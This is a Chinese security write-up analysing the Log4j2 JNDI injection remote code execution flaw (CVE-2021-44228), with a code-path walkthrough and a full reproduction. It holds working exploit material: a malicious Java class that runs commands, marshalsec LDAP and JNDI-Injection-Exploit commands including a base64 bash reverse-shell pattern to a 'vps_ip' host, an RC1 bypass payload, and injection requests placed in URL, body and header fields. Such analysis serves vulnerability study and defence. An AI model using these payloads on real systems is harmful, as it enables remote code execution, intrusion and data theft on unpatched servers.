# 0x00 漏洞概述
Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。

Log4j2中存在JNDI注入漏洞，当程序将用户输入的恶意数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。

![image](https://user-images.githubusercontent.com/84888757/162125396-59c35299-9ff0-4f1f-b4d1-42e42d994a42.png)

# 0x01 影响版本
Apache Log4j 2.x < 2.15.0-rc2

# 0x02 漏洞分析
根据[官方的修订信息](https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues)，可以知道该漏洞的利用方式是：通过 JNDI 注入的方式实现了 RCE

根据[补丁更改记录](https://github.com/apache/logging-log4j2/commit/7fe72d6)，可以发现对`lookup`函数进行了修改判断。

![image](https://user-images.githubusercontent.com/84888757/162127103-50052d95-7549-4f16-81fe-e9ff17b99f58.png)

查看官方文档中关于lookup的说明，可以得知`lookup`提供了一种在任意位置向 Log4j2 配置添加值的方法，是实现StrLookup接口的特殊类型的插件。

- 其中就包括本次漏洞中关键的`jndi`方法。

根据JNDI lookup官方文档说明，JNDI Lookup允许通过 JNDI 检索变量，示例如下：
```
<File name="Application" fileName="application.log">
    <PatternLayout>
        <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
    </PatternLayout>
</File>
```

在log4j `jdni`的用法格式如下：
```
${jndi:JNDIContent}
```

所以现在的思路如下：
- 触发漏洞的点是lookup
- 可以通过lookup -> 调用JNDI -> 调用LDAP进行RCE
- 攻击者可通过传入payload `${jndi:JNDIContent}` 实现以上两步

那么问题来了，从哪里传入`payload ${jndi:JNDIContent}` ？

答案是：`LogManager.getLogger().xxxx()` 方法

在log4j2中，共有8 个日志级别，可以通过LogManager.getLogger()调用记录日志的方法如下：
```
LogManager.getLogger().error()
LogManager.getLogger().fatal()

LogManager.getLogger().trace()
LogManager.getLogger().traceExit()
LogManager.getLogger().traceEntry()
LogManager.getLogger().info()
LogManager.getLogger().warn()
LogManager.getLogger().debug()
LogManager.getLogger().log()
LogManager.getLogger().printf()
```
但是在默认情况下，只有`error()`和`fatal()`方法可默认触发漏洞，其余的方法需要配置日志级别才可以触发漏洞。

因为在logIfEnabled方法中，对当前日志等级进行了一次判断，只有当**当前事件的日志等级**大于等于**设置的日志等级**时，才会符合条件，进入logIfEnabled方法，具体的整个代码流程我们来看以下部分。

## 环境搭建
1、创建一个新的maven项目，并导入Log4j的依赖包
```
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
```
2、漏洞代码
   log4j_rce.java
```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j_rce {
    private static final Logger logger = LogManager.getLogger(log4j_rce.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://xxxxx.dnslog.cn/exp}");
    }
}
```

## 代码调试分析

在尝试理解一个漏洞时，我们可以只看一些关键的函数调用，让我们开始吧！

下断点，调试

![image](https://user-images.githubusercontent.com/84888757/162129881-ed7c9622-ff6c-4366-90a8-df6cc2fca322.png)

跟进，首先会调用`AbstractLogger.class`中的`error()`方法：

![image](https://user-images.githubusercontent.com/84888757/162129954-b6ff07fe-9797-4a5e-94d2-d2286685eb70.png)

在`error()`方法中会调用`logIfEnabled`判断是否符合日志记录的等级要求，如果符合，那么会进行`logMessage`操作：

![image](https://user-images.githubusercontent.com/84888757/162130135-2fb13eab-aa1d-4d28-9dce-ceed7eb851f6.png)

后续不关键调用路径如下：

```
logMessage ----> logMessageSafely ----> logMessageTrackRecursion ----> tryLogMessage ----> log ----> DefaultReliabilityStrategy.log ----> loggerConfig.log ----> processLogEvent ----> callAppenders ----> tryCallAppender ----> append ----> tryAppend ----> directEncodeEvent ----> encode ----> toText ----> toSerializable ---->format----> PatternFormatter.format
```

此时，我们看到了关键点 `format()` 

在 `org.apache.logging.log4j.core.pattern.MessagePatternConverter` 的 `format()` 方法，替换了攻击者恶意的表达式。

如果检测到`$`字符后跟了一个`{`字符，那么会对直到`}`中间的内容进行解析并替换replace操作。

![image](https://user-images.githubusercontent.com/84888757/162130705-0c32a15c-c4a1-43fa-a731-59f0d553c63d.png)

继续一步一步跟进，直到下一个关键点`Interpolator.lookup`
```
replace --> substitute --> StrSubstitutor.substitute --> resolveVariable --> Interpolator.lookup
```

替换replace是一个字符串查找的过程，方法如下：
- 在`Interpolator.lookup`方法中，将`${xxx:yyy}`的结构由 `:` 字符进行分割，解析为`prefix`和`name`两部分。
- 在`Interpolator.lookup`方法中，通过`prefix`去`strLookupMap`哈希表查询对应的`lookup`方法，再通过实例调用相应的`lookup()`方法，将`name`作为参数带入执行。

这里是 `JNDI` 方法，那么就会由`JndiLookup`类进一步处理：

![image](https://user-images.githubusercontent.com/84888757/162131237-996b3f5f-b736-48d6-8c6f-dc508bb75087.png)

![image](https://user-images.githubusercontent.com/84888757/162131307-8f33e311-2f7a-4e50-a106-4525d280bdb4.png)

跟进`JndiLookup`，找到最后的触发点`jndiManager.lookup`

![image](https://user-images.githubusercontent.com/84888757/162131659-54b1c759-e197-4b70-bf32-d7d084d315de.png)

最后跟入的触发点`org.apache.logging.log4j.core.net.JndiManager#lookup`如下图所示。

通过jndi加载由攻击者传入的LDAP服务端地址，然后返回一个恶意的JNDI Reference对象，触发漏洞，实现 RCE。

![image](https://user-images.githubusercontent.com/84888757/162132266-b45a4cc9-70e7-4b17-9d86-6ce41589b35a.png)

# 0x03 漏洞复现
写复现过程的时候，我使用的是 macOS 系统，如果是 Windows 系统，则启动计算器代码如下：
- String[] commands = {"calc.exe"};

漏洞代码：log4j_rce.java
```
package org.example;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j_rce {
    private static final Logger logger = LogManager.getLogger(log4j_rce.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:9999/CalcPoc}");
    }
}
```

使用marsharsec开启一个LDAP服务
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#CalcPoc" 9999
```

![image](https://user-images.githubusercontent.com/84888757/162133243-22ca3f03-3133-4830-a65c-aff0776c368b.png)

编写恶意java文件
- CalcPoc.java
```
import java.lang.Runtime;
import java.lang.Process;


public class CalcPoc{
  public CalcPoc() {
    try {
      System.out.println("--- 漏洞代码开始执行 ---");
      String[] commands = {"open", "/System/Applications/Calculator.app"}; // 启动系统计算器
      Process pc = Runtime.getRuntime().exec(commands);
      pc.waitFor();
      System.out.println("--- 漏洞代码完成执行 ---");
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
```

编译恶意类：javac CalcPoc.java

开启http服务以便获取恶意类

![image](https://user-images.githubusercontent.com/84888757/162133467-257568c0-be52-4cf5-9e17-ecb2f4b8be08.png)

运行漏洞代码，成功：

![image](https://user-images.githubusercontent.com/84888757/162133521-aed18334-ff6b-485f-afa6-ca841d00093f.png)

![image](https://user-images.githubusercontent.com/84888757/162133637-9277cd02-f308-4b96-8f83-aab854bd0fe1.png)

![image](https://user-images.githubusercontent.com/84888757/162133703-4a52dd3e-ae90-49dd-91e7-2212a662102c.png)

如果想反弹shell，你只需要修改恶意类中的命令即可。

这里为了便于理解利用流程，复现时使用了marsharsec工具起LDAP服务，并且再起了http服务存放恶意类。

在实际利用时，可以使用[JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit/releases)工具，更加方便。
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}" -A "vps_ip"
```

![image](https://user-images.githubusercontent.com/84888757/165697356-40406213-ecb8-4432-8c1a-314adad199c9.png)

![image](https://user-images.githubusercontent.com/84888757/165697563-ad29bb0b-3434-434e-aca4-b4cabb13c8a0.png)

![image](https://user-images.githubusercontent.com/84888757/165697719-9b3687ab-07eb-40f1-a59e-28fc746cf3ad.png)



# 0x04 RC1绕过
- [Apache Log4j2从RCE到RC1绕过 @4ra1n](https://xz.aliyun.com/t/10649)


payload如下，在之前的基础上加个空格：
```
${jndi:ldap://127.0.0.1:1389/ badClassName}
```

# 0x05 常见漏洞位置
## URL
- URL路径
    - 🌰 Apache Druid的POC：`http://example.com/druid/coordinator/v1/lookups/config/${jndi:ldap://xxxx.dnslog.cn/test}`
- URL参数
    - 🌰 Apache Solr的POC：`http://example.com/solr/admin/cores?action=${jndi:ldap://xxxx.dnslog.cn/test}`

## HTTP Body
- 可能存在漏洞的功能点：登录、业务流程、审批接口等。
- 可能存在不同的请求格式：例如Form、Json、XML等。
- 可能会对参数进行编码、加密等操作，加大检测难度。

🌰 登录口 - Form格式
```
POST /zkaq/log4jrce HTTP/1.1
Host: d63bb2586.lab.aqlab.cn
Connection: close

username=${jndi:ldap://xxxx.dnslog.cn/def}&password=123456
```
 
🌰 某次实战案例 - json格式
    
```
POST /xxx/xxxx HTTP/1.1
Host: xx.xx.xx.xx
Connection: close
Content-Length: 153
Content-Type: application/json

{"type":"delete","se":{"runningSessions":[],"bUrl":"${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}"}}
```

## Header
- 可能存在漏洞的Header字段：X-Forworded-For、Accept、User-Agent等
- 也有部分框架中的Log4j漏洞存在于Header中
    - [Struts2框架，header中的`If-Modified-Since`字段存在该漏洞](https://twitter.com/payloadartist/status/1469987703429103622)
    - 🌰 某次实战案例 - Accept字段
```
POST /aaa/bbbb HTTP/1.1
Host: xx.xx.xx.xx
Accept: ${jndi:dns://xxxx.dnslog.cn/test}
Content-Type: application/json
Connection: close

{
"username"="admin",
"password"="123456"
}
```

# 0x06 参考链接
- [JNDI 注入漏洞的前世今生 @evilpan](https://mp.weixin.qq.com/s/vnMU-GQgNEVdi2hr839jOA)
- [log4j2 JNDI 注入漏洞分析 @panda](https://www.cnpanda.net/sec/1114.html)
- [SpringBoot - Log4j2远程代码执行漏洞详解 @hangge](https://www.hangge.com/blog/cache/detail_3153.html)
- [Apache Log4j2从RCE到RC1绕过 @4ra1n](https://xz.aliyun.com/t/10649)
- [log4j2 JNDI注入漏洞速通 @LoRexxar](https://lorexxar.cn/2021/12/10/log4j2-jndi/)
- [Log4j2-CVE-2021-44228(全) @jas502n](https://github.com/jas502n/Log4j2-CVE-2021-44228)
- [CVE-2021-44228(Log4j2 RCE)常见漏洞位置](https://blog.wanghw.cn/security/cve-2021-44228-vul-location.html)
- [LDAP注入与防御剖析 @r00tgrok](http://drops.leesec.com/#!/drops/155.LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90)
